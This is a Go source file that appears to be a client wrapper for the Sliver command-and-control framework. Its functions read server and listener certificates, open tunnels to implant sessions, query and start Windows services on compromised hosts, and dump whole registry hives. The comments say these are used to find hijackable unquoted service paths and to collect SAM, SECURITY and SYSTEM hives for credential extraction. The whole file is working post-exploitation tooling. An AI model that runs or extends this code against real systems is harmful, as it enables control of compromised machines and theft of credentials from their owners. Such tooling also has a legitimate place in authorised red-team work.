package sliver

import (
	"errors"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// ---------------------------------------------------------------------------
// Certificates
//
// Every deployment has a CA and per-listener certificates. Being able to read
// them from the console matters when pinning an implant or fingerprinting what
// a target has already seen.
// ---------------------------------------------------------------------------

// CertificateView is the JSON shape of a certificate.
type CertificateView struct {
	CN          string `json:"CN"`
	Expiry      string `json:"Expiry"`
	KeyType     string `json:"KeyType"`
	KeyUsage    string `json:"KeyUsage"`
	IsCA        bool   `json:"IsCA"`
	Certificate string `json:"Certificate"`
}

// CertificateAuthority returns the server's CA material.
func (c *Client) CertificateAuthority() ([]CertificateView, error) {
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	resp, err := c.RPC.GetCertificateAuthorityInfo(ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := make([]CertificateView, 0, len(resp.Info))
	for _, x := range resp.Info {
		out = append(out, CertificateView{
			CN:          x.CN,
			Expiry:      x.ValidityExpiry,
			KeyType:     x.KeyAlgorithm,
			IsCA:        true,
			Certificate: x.Type,
		})
	}
	return out, nil
}

// Certificates lists issued certificates in the given category.
func (c *Client) Certificates(category uint32, cn string) ([]CertificateView, error) {
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	resp, err := c.RPC.GetCertificateInfo(ctx, &clientpb.CertificatesReq{
		CategoryFilters: category,
		CN:              cn,
	})
	if err != nil {
		return nil, err
	}
	out := make([]CertificateView, 0, len(resp.Info))
	for _, x := range resp.Info {
		out = append(out, CertificateView{
			CN:          x.CN,
			Expiry:      x.ValidityExpiry,
			KeyType:     x.KeyAlgorithm,
			IsCA:        x.Type == "CA",
			Certificate: x.Type,
		})
	}
	return out, nil
}

// ---------------------------------------------------------------------------
// Tunnel management
// ---------------------------------------------------------------------------

// Tunnels associates session IDs with live tunnel IDs.
type TunnelView struct {
	TunnelID  uint64 `json:"TunnelID"`
	SessionID string `json:"SessionID"`
}

// CreateTunnel opens a tunnel for a session and returns its ID.
func (c *Client) CreateTunnel(sessionID string) (uint64, error) {
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	resp, err := c.RPC.CreateTunnel(ctx, &sliverpb.Tunnel{SessionID: sessionID})
	if err != nil {
		return 0, err
	}
	return resp.TunnelID, nil
}

// CloseTunnel tears a tunnel down.
func (c *Client) CloseTunnel(tunnelID uint64, sessionID string) error {
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	_, err := c.RPC.CloseTunnel(ctx, &sliverpb.Tunnel{TunnelID: tunnelID, SessionID: sessionID})
	return err
}

// ---------------------------------------------------------------------------
// Windows service detail
// ---------------------------------------------------------------------------

// ServiceDetailView is the JSON shape of a Windows service's configuration.
type ServiceDetailView struct {
	Name        string `json:"Name"`
	DisplayName string `json:"DisplayName"`
	Description string `json:"Description"`
	Status      uint32 `json:"Status"`
	StartupType uint32 `json:"StartupType"`
	BinPath     string `json:"BinPath"`
	Account     string `json:"Account"`
}

// ServiceDetail returns the full configuration of one Windows service, which is
// what identifies a hijackable unquoted service path.
func (c *Client) ServiceDetail(sessionID, name, hostname string) (ServiceDetailView, error) {
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	resp, err := c.RPC.ServiceDetail(ctx, &sliverpb.ServiceDetailReq{
		ServiceInfo: &sliverpb.ServiceInfoReq{ServiceName: name, Hostname: hostname},
		Request:     &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return ServiceDetailView{}, err
	}
	if resp.GetResponse().GetErr() != "" {
		return ServiceDetailView{}, errors.New(resp.GetResponse().GetErr())
	}
	d := resp.Detail
	if d == nil {
		return ServiceDetailView{}, errors.New(resp.Message)
	}
	return ServiceDetailView{
		Name:        d.Name,
		DisplayName: d.DisplayName,
		Description: d.Description,
		Status:      d.Status,
		StartupType: d.StartupType,
		BinPath:     d.BinPath,
		Account:     d.Account,
	}, nil
}

// StartServiceByName starts a service by its service name rather than by path.
func (c *Client) StartServiceByName(sessionID, name, hostname string) error {
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	resp, err := c.RPC.StartServiceByName(ctx, &sliverpb.StartServiceByNameReq{
		ServiceInfo: &sliverpb.ServiceInfoReq{ServiceName: name, Hostname: hostname},
		Request:     &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return err
	}
	if resp.GetResponse().GetErr() != "" {
		return errors.New(resp.GetResponse().GetErr())
	}
	return nil
}

// ---------------------------------------------------------------------------
// Registry hive extraction
// ---------------------------------------------------------------------------

// RegistryReadHive dumps a whole registry hive, returning the raw bytes and the
// encoder the implant used. Combined with offline parsing this is how SAM,
// SECURITY and SYSTEM are collected for credential extraction.
func (c *Client) RegistryReadHive(sessionID, rootHive, requestedHive string) ([]byte, string, error) {
	ctx, cancel := c.rpcCtx(5 * opTimeout)
	defer cancel()
	resp, err := c.RPC.RegistryReadHive(ctx, &sliverpb.RegistryReadHiveReq{
		RootHive:      rootHive,
		RequestedHive: requestedHive,
		Request:       &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, "", err
	}
	if resp.GetResponse().GetErr() != "" {
		return nil, "", errors.New(resp.GetResponse().GetErr())
	}
	return resp.Data, resp.Encoder, nil
}
